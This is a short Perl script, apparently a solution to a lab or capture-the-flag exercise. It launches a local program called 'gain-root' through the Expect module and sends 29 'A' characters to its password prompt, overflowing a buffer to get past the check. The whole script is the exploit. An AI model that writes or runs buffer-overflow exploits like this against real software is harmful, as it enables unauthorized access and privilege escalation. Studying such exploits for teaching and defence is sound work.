#!/usr/bin/env perl

use strict;
use Expect;

my $timeout = 10; 
my $buffer_fill = "A" x 29;

my $input = $buffer_fill."\n";
my $command = "./gain-root ";

my $exp = Expect->spawn($command) or die "Cannot spawn cookie-win command \n";

$exp->expect($timeout, ["enter the password :"]); 
$exp->send($input);
$exp->soft_close();
